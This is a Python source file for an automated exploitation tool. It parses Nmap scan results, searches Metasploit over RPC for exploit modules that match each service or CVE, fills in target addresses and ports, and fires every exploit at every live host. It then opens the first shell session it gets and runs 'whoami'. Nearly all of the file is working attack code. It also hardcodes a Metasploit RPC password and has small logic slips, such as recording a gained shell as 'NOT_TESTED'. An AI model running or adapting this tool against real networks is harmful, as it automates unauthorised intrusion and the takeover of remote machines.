from pymetasploit3.msfrpc import MsfRpcClient
from parse_scan import parse_from_JSON
from sys import argv
import netifaces

NOT_TESTED = 'NOT_TESTED'
NO_SHELL = 'NO_SHELL'
GOT_SHELL = 'GOT_SHELL'
FAILED = 'FAILED'

class ExploitManager:
    def __init__(self, server_ip: str, password: str, port: int):
        """Instantiates an object of the MetasploitManager class.""" 
        self.server_ip = server_ip
        self.parsed_scan = None
        self.modules = None
        self.manager = MsfRpcClient(password, ip=server_ip, port=port)

    def load_scan(self, parsed_scan: dict):
        """Loads a new Nmap scan to be analyzed.""" 
        self.parsed_scan = parsed_scan 
        self.modules = {}
    
    def load_options(self, options: dict):
        """Loads modules to be used on each port.""" 
        self.modules = options

    def analyze_scan(self) -> dict:
        """Find useful modules from Metasploit manager based on CVE in parsed_scan 
        and fill the missing required option using the information stored in parsed_scan
        
        Returns:
            (dict): Modules found and their respective settings.
        """
        for ip, scan in self.parsed_scan.items():
            if scan["state"] != "up":
                continue
            for port, info in scan["ports"].items():
                if info.get("service"):
                    self.get_module(ip, port, info.get("service"))
                cve_set = info.get("vulner", [])
                for cve in cve_set:
                    self.get_module(ip, port, cve)
        return self.modules

    def get_module(self, ip: str, port: str, vulnerability: str):
        """Gets a metasploit module given the target IP, port and a
        vulnerability.
    
        Args:
            ip (str): The IP address of the target machine.
            port(int): The port of the target machine.
            vulnerability (str): The vulnerability to be searched.
        
        Returns:
            (dict): Module found and its settings.
        """
        module_list = self.manager.modules.search(vulnerability)            
        for module in module_list:
            module_name = module.get("fullname")
            if module and module_name and module.get("type") == "exploit":
                #Initializes all nested dictionaries for that specific vulnerability if they don't already exist.

                self.modules[ip] = self.modules.get(ip, {})
                self.modules[ip][port] = self.modules[ip].get(port, {})
                self.modules[ip][port][vulnerability] = self.modules[ip][port].get(vulnerability, {})
                self.modules[ip][port][vulnerability]["module_name"] = module_name
                self.modules[ip][port][vulnerability]["status"] = NOT_TESTED
                self.modules[ip][port][vulnerability]["options"] = self.modules[ip][port][vulnerability].get("options", {})
                
                module = self.manager.modules.use("exploit", module_name)
                missing = module.missing_required
                for option in module.options:
                    if option in missing:
                        setting = self.fill_option(option, ip, port)
                        if setting:
                            self.modules[ip][port][vulnerability]['options'][option] = self.fill_option(option, ip, port)
                        else:
                            print(f"Option {option} in module {module_name} not configured.")
                    else:
                        self.modules[ip][port][vulnerability]['options'][option] = module[option]
                return self.modules[ip][port][vulnerability]

    def fill_option(self, option_name:str, target_ip:str, target_port: str)->str | int:
        """Chose which passed value to return based on option_name"""
        option = option_name.upper()
        if "RHOST" in option:
            return target_ip
        elif option == "SRVHOST" or option == "CHOST":
            return self.server_ip
        elif "RPORT" in option:
            return target_port
        else:
            return None

    def exploit(self, ip: str, port: int, vulnerability: str) -> dict:
        """Exploits the target given its IP, port and a vulnerability.
    
        Args:
            ip (str): The IP address of the target machine.
            port(int): The port of the target machine.
            vulnerability (str): The code of the vulnerability to be exploited.
        
        Returns:   
            (dict): Information about the exploit job.
        """
        try:
            vuln_info = self.modules[ip][port][vulnerability]
        except KeyError:
            print(f"Vulnerability {vulnerability} of {ip}:{port} not saved.")
            return {}
        module = self.manager.modules.use("exploit", vuln_info["module_name"])
        for option_name, setting in vuln_info["options"].items():
            if setting:
                module[option_name] = setting
        num_shells = len(self.manager.sessions.list)
        result = module.execute()
        if len(self.manager.sessions.list) > num_shells:
            self.modules[ip][port][vulnerability]["status"] = NOT_TESTED
        elif result.get('job_id') is None:
            self.modules[ip][port][vulnerability]["status"] = FAILED
        else:
            self.modules[ip][port][vulnerability]["status"] = NO_SHELL
        return result

    def exploit_all(self):
        """Uses all vulnerabilities on self.modules to exploit all their
        respective targets.
    
        (list): Result from all exploit jobs
        """
        results = []
        for ip, scan in self.modules.items():
            for port, port_scan in scan.items():
                for vulnerability in port_scan:
                    result = self.exploit(ip, port, vulnerability)
                    results.append(result)
        return results

from pprint import pprint

if __name__ == "__main__":
    if len(argv) < 2:
        print("Usage: py parse_metasploit.py <file> <msfpassword> <msfport>; e.g. py parse_metasploit.py seed/10.1.0.1.json")
        exit(1)
    result = parse_from_JSON(argv[1])
    #pprint(result)
    manager = ExploitManager('127.0.0.1', 'ETSXfaAO', 55552)
    manager.load_scan(result) 
    manager.analyze_scan()
    pprint(manager.exploit_all())
    pprint(manager.modules)
    pprint(manager.manager.sessions.list)
    shell = manager.manager.sessions.session('1')
    shell.write('whoami')
    shell.read()
